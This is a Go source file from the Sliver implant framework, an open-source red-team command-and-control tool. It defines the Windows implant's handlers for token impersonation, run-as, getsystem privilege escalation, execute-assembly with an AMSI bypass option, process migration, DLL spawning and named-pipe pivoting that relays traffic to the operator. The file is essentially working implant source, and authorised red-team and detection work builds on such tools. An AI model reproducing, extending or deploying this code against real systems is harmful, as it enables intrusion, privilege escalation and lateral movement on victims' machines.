package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{end}}
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/priv"
	"github.com/bishopfox/sliver/sliver/taskrunner"
	"github.com/bishopfox/sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
	"golang.org/x/sys/windows"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		// Windows Only
		pb.MsgTask:               taskHandler,
		pb.MsgRemoteTask:         remoteTaskHandler,
		pb.MsgProcessDumpReq:     dumpHandler,
		pb.MsgImpersonateReq:     impersonateHandler,
		pb.MsgRevToSelf:          revToSelfHandler,
		pb.MsgRunAs:              runAsHandler,
		pb.MsgGetSystemReq:       getsystemHandler,
		pb.MsgElevateReq:         elevateHandler,
		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
		pb.MsgMigrateReq:         migrateHandler,
		pb.MsgSpawnDllReq:        spawnDllHandler,

		// Generic
		pb.MsgPsReq:       psHandler,
		pb.MsgTerminate:   terminateHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgLsReq:       dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
		pb.MsgIfconfigReq: ifconfigHandler,
		pb.MsgExecuteReq:  executeHandler,

		pb.MsgScreenshotReq: screenshotHandler,

		pb.MsgSideloadReq: sideloadHandler,
		pb.MsgNetstatReq:  netstatHandler,
	}

	windowsPivotHandlers = map[uint32]PivotHandler{
		pb.MsgNamedPipesReq: namedPipeListenerHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return windowsPivotHandlers
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	var errStr string
	impersonateReq := &pb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err != nil {
		errStr = err.Error()
	} else {
		taskrunner.CurrentToken = token
	}
	impersonate := &pb.Impersonate{
		Err: errStr,
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	var errStr string
	runAsReq := &pb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.Process, runAsReq.Args)
	if err != nil {
		errStr = err.Error()
	}
	runAs := &pb.RunAs{
		Output: out,
		Err:    errStr,
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	var errStr string
	//{{if .Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	if err != nil {
		errStr = err.Error()
	}
	revToSelfResp := &pb.RevToSelf{
		Err: errStr,
	}
	//{{if .Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelfResp)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	gsReq := &pb.GetSystemReq{}
	err := proto.Unmarshal(data, gsReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(gsReq.Data, gsReq.HostingProcess)
	gsResp := &pb.GetSystem{}
	if err != nil {
		gsResp.Output = err.Error()
	}
	data, err = proto.Marshal(gsResp)
	resp(data, err)
}

func elevateHandler(data []byte, resp RPCResponse) {
	elevateReq := &pb.ElevateReq{}
	err := proto.Unmarshal(data, elevateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	elevate := &pb.Elevate{}
	err = priv.Elevate()
	if err != nil {
		elevate.Err = err.Error()
		elevate.Success = false
	} else {
		elevate.Success = true
		elevate.Err = ""
	}
	data, err = proto.Marshal(elevate)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	//{{if .Debug}}
	log.Println("executeAssemblyHandler called")
	//{{end}}
	execReq := &pb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass)
	strErr := ""
	if err != nil {
		strErr = err.Error()
	}
	execResp := &pb.ExecuteAssembly{
		Output: output,
		Error:  strErr,
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)

}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &pb.MigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &pb.Migrate{
		Success: true,
		Err:     "",
	}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Err = err.Error()
		// {{if .Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &pb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	spawnResp := &pb.SpawnDll{
		Result: result,
		Error:  errStr,
	}
	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func nampedPipeAcceptNewConnection(ln *net.Listener, connection *transports.Connection) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
	for {
		conn, err := (*ln).Accept()
		if err != nil {
			continue
		}
		rand.Seed(time.Now().UnixNano())
		pivotID := rand.Uint32()
		pivotsMap.AddPivot(pivotID, &conn)
		SendPivotOpen(pivotID, "named-pipe", namedPipe, connection)

		// {{if .Debug}}
		log.Println("Accepted a new connection")
		// {{end}}

		// handle connection like any other net.Conn
		go nampedPipeConnectionHandler(&conn, connection, pivotID)
	}
}

func nampedPipeConnectionHandler(conn *net.Conn, connection *transports.Connection, pivotID uint32) {

	defer func() {
		// {{if .Debug}}
		log.Printf("Cleaning up for pivot %d\n", pivotID)
		// {{end}}
		(*conn).Close()
		pivotClose := &pb.PivotClose{
			PivotID: pivotID,
		}
		data, err := proto.Marshal(pivotClose)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
			return
		}
		if connection.IsOpen {
			connection.Send <- &pb.Envelope{
				Type: pb.MsgPivotClose,
				Data: data,
			}
		}
	}()

	for {
		envelope, err := pivots.PivotReadEnvelope(conn)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
			return
		}
		dataBuf, err1 := proto.Marshal(envelope)
		if err1 != nil {
			// {{if .Debug}}
			log.Println(err1)
			// {{end}}
			return
		}
		pivotOpen := &pb.PivotData{
			PivotID: pivotID,
			Data:    dataBuf,
		}
		data2, err2 := proto.Marshal(pivotOpen)
		if err2 != nil {
			// {{if .Debug}}
			log.Println(err2)
			// {{end}}
			return
		}
		if connection.IsOpen {
			connection.Send <- &pb.Envelope{
				Type: pb.MsgPivotData,
				Data: data2,
			}
		}
	}
}

func namedPipeListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	namedPipeReq := &pb.NamedPipesReq{}
	err := proto.Unmarshal(envelope.Data, namedPipeReq)

	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		namedPipeResp := &pb.NamedPipes{
			Success: false,
			Err:     err.Error(),
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	var ln net.Listener
	ln, err = winio.ListenPipe("\\\\.\\pipe\\"+namedPipeReq.GetPipeName(), nil)
	// {{if .Debug}}
	log.Printf("Listening on %s", "\\\\.\\pipe\\"+namedPipeReq.GetPipeName())
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("error with listener: %s", err.Error())
		// {{end}}
		namedPipeResp := &pb.NamedPipes{
			Success: false,
			Err:     err.Error(),
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}

	go nampedPipeAcceptNewConnection(&ln, connection)

	namedPipeResp := &pb.NamedPipes{
		Success: true,
	}
	data, _ := proto.Marshal(namedPipeResp)
	connection.Send <- &pb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}
